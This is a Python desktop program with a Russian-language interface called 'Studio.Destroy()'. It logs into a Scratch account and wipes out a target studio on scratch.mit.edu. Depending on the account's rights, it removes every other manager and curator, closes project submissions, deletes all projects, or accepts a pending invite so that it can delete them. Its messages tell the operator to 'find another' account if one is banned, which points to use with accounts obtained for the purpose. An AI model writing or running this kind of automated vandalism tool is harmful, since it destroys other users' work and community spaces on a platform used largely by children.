import tkinter as tk
from tkinter import scrolledtext
import requests
import time
import re
import threading
from http.cookies import SimpleCookie
from datetime import datetime, timedelta, UTC


def login(username, password):
    session = requests.Session()
    session.get("https://scratch.mit.edu/csrf_token/")
    csrf_token = session.cookies.get('scratchcsrftoken')
    headers = {
        "referer": "https://scratch.mit.edu",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRFToken": csrf_token,
        "Content-Type": "application/json",
        "Accept-Language": "ru-RU,ru;q=0.9"
    }
    body = {
        "username": username,
        "password": password,
        "useMessages": "true"
    }
    respo = session.post(
        "https://scratch.mit.edu/accounts/login/",
        headers=headers,
        json=body
    )
    if respo.status_code == 200:
        cookies = respo.cookies
        for cook in cookies:
            if cook.name == 'scratchsessionsid':
                cookie_string = cookie_to_string(cook)
        match = re.search(r'([^=]+)="\\"([^"]+)\\""', cookie_string)
        if match:
            cookie_name = match.group(1)
            cookie_value = match.group(2)
            clean_cookie = f'{cookie_name}="{cookie_value}"'
            clean_cookie = clean_cookie + ";scratchcsrftoken=" + csrf_token
        head = {
            "Cookie": clean_cookie,
            "referer": "https://scratch.mit.edu/",
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Accept-Language": "ru-RU,ru;q=0.9",
            "Origin": "https://scratch.mit.edu",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept": "*/*",
        }
        return {"success": True, "cookie": head}
    else:
        data = respo.json()
        return {"success": False, "msg": data[0].get("msg")}


def isbanned(cookie):
    resp = requests.get("https://scratch.mit.edu/session/", headers=cookie)
    r = resp.json()
    return r["user"]["banned"]


def getrights(cookie, studio):
    resp = requests.get("https://scratch.mit.edu/session/", headers=cookie)
    r = resp.json()
    resp = requests.get(
        f"https://api.scratch.mit.edu/studios/{str(studio)}/users/{r['user']['username']}",
        headers={"X-Token": r['user']['token']}
    )
    r = resp.json()
    if r.get("manager"):
        return "manager"
    elif r.get("curator"):
        return "curator"
    elif r.get("invited"):
        return "invited"
    else:
        return "-"


def removeuser(cookie, studio, user):
    resp = requests.put(
        f"https://scratch.mit.edu/site-api/users/curators-in/{str(studio)}/remove/?usernames={user}",
        headers=cookie
    )
    return resp.status_code == 200


def removecurators(cookie, studio):
    loop = True
    while loop:
        req = requests.get(f"https://api.scratch.mit.edu/studios/{str(studio)}/curators?limit=40")
        curators = req.json()
        if len(curators) < 40:
            loop = False
        for curator in curators:
            if not removeuser(cookie, studio, curator["username"]):
                log(f"Произошла ошибка при удалении {curator['username']}")
            time.sleep(0.5)


def closeprojects(cookie, studio):
    resp = requests.put(
        f"https://scratch.mit.edu/site-api/galleries/{str(studio)}/mark/closed/",
        headers=cookie
    )
    return resp.status_code == 200


def removeprojects(cookie, studio):
    resp = requests.get("https://scratch.mit.edu/session/", headers=cookie)
    r = resp.json()
    token = r["user"]["token"]
    loop = True
    while loop:
        a = requests.get(f"https://api.scratch.mit.edu/studios/{studio}/projects/?limit=40")
        projects = a.json()
        l = len(projects)
        for p in projects:
            r = requests.delete(
                f"https://api.scratch.mit.edu/studios/{studio}/project/{p.get('id')}/",
                headers={"X-Token": token}
            )
            if r.status_code not in (200, 204):
                log(f"Ошибка {str(r.status_code)} при удалении проекта")
                time.sleep(10)
            else:
                time.sleep(0.1)
        if l < 40:
            loop = False


def acceptinvite(cookie, studio):
    resp = requests.get("https://scratch.mit.edu/session/", headers=cookie)
    r = resp.json()
    resp = requests.put(
        f"https://scratch.mit.edu/site-api/users/curators-in/{str(studio)}/add/?usernames={r['user']['username']}",
        headers=cookie
    )
    return resp.status_code == 200


def removemanagers(cookie, studio):
    req = requests.get(f"https://api.scratch.mit.edu/studios/{str(studio)}/managers?limit=40&offset=1")
    managers = req.json()
    ses = requests.get("https://scratch.mit.edu/session/", headers=cookie)
    r = ses.json()
    myusername = r["user"]["username"]
    for user in managers:
        if user["username"] != myusername:
            if not removeuser(cookie, studio, user["username"]):
                log(f"Произошла ошибка при удалении {user['username']}")
            time.sleep(0.5)


def cookie_to_string(cookie):
    c = SimpleCookie()
    c[cookie.name] = cookie.value
    morsel = c[cookie.name]
    if getattr(cookie, 'domain', None):
        morsel['domain'] = cookie.domain
    if getattr(cookie, 'path', None):
        morsel['path'] = cookie.path
    if getattr(cookie, 'secure', None):
        morsel['secure'] = True
    if getattr(cookie, 'httponly', None):
        morsel['httponly'] = True
    if hasattr(cookie, 'expires'):
        expires_date = datetime.now(UTC) + timedelta(weeks=2)
        morsel['expires'] = expires_date.strftime('%a, %d-%b-%Y %H:%M:%S GMT')
    if isinstance(getattr(cookie, 'expires', None), int):
        morsel['Max-Age'] = cookie.expires
    return morsel.OutputString()


def destroy():
    threading.Thread(target=destroy_worker, daemon=True).start()


def destroy_worker():
    studio = int(re.findall(r'\d+', studiotextbox.get())[0])
    password = password_entry.get()
    username = username_entry.get()
    logged = login(username, password)
    log("Запуск...")
    if logged.get("success"):
        cookie = logged["cookie"]
        if isbanned(cookie):
            log("Аккаунт забанен! Найдите другой.")
            return
        status = getrights(cookie, studio)
        if status == "manager":
            log("Отлично! Аккаунт - менеджер! Начинаем уничтожение")
            log("Удаляем менеджеров!")
            removemanagers(cookie, studio)
            log("Удаляем кураторов!")
            removecurators(cookie, studio)
            log("Закрываем доступ к проектам!")
            if not closeprojects(cookie, studio):
                log("Не удалось закрыть доступ к проектам, но ладно")
            log("Удаляем проекты!")
            removeprojects(cookie, studio)
            log("Проекты удалены!")
            log("Удаляем себя!")
            removeuser(cookie, studio, username)
            log("Готово!")
        elif status == "curator":
            log("Аккаунт - куратор! Удаляем проекты")
            removeprojects(cookie, studio)
            log("Готово")
        elif status == "invited":
            log("Аккаунт приглашён! Принимаем приглашение!")
            acceptinvite(cookie, studio)
            log("Аккаунт теперь куратор! Удаляем проекты!")
            removeprojects(cookie, studio)
            log("Проекты удалены!")
        else:
            log("Аккаунт не приглашён в студию :(")
    else:
        log("Ошибка входа: " + logged.get("msg", "неизвестная ошибка"))


def log(message):
    def append():
        log_area.config(state="normal")
        log_area.insert(tk.END, message + "\n")
        log_area.see(tk.END)
        log_area.config(state="disabled")
    root.after(0, append)


root = tk.Tk()
root.title("Studio.Destroy()")
root.geometry("500x300")
root.resizable(False, False)

frame_auth = tk.Frame(root)
frame_auth.pack(fill=tk.X, padx=10, pady=5)

tk.Label(frame_auth, text="Имя пользователя:", font=("Arial", 10)).grid(row=0, column=0, sticky="w")
username_entry = tk.Entry(frame_auth, font=("Arial", 12))
username_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=2)

tk.Label(frame_auth, text="Пароль:", font=("Arial", 10)).grid(row=1, column=0, sticky="w")
password_entry = tk.Entry(frame_auth, font=("Arial", 12), show="●")
password_entry.grid(row=1, column=1, sticky="ew", padx=5, pady=2)

frame_auth.columnconfigure(1, weight=1)

studiotextbox = tk.Entry(root, font=("Arial", 14))
studiotextbox.pack(fill=tk.X, padx=10, pady=10)

button_frame = tk.Frame(root)
button_frame.pack(fill=tk.X, padx=10, pady=5)

btn_destroy = tk.Button(button_frame, text="Уничтожить!", bg="orange", fg="white", font=("Arial", 12), command=destroy)
btn_destroy.pack(side=tk.RIGHT, expand=True, fill=tk.X, padx=5)

bottom_frame = tk.Frame(root)
bottom_frame.pack(side="bottom", fill="x")

# Копирайт внизу справа
copyright_label = tk.Label(
    bottom_frame,
    text="© 2025 Quantum Research",
    font=("Arial", 8),
    fg="gray"
)
copyright_label.pack(side="right", padx=5, pady=2)

# Поле для логов над копирайтом
log_area = scrolledtext.ScrolledText(root, height=8, font=("Consolas", 10))
log_area.pack(side="bottom", fill=tk.BOTH, padx=10, pady=(10, 0), expand=True)

# Копирайт в правом нижнем углу
copyright_label = tk.Label(
    root,
    text="© 2025 Quantum Research",
    font=("Arial", 8),
    fg="gray"
)
copyright_label.pack(side="bottom", anchor="e", padx=5, pady=2)

root.mainloop()
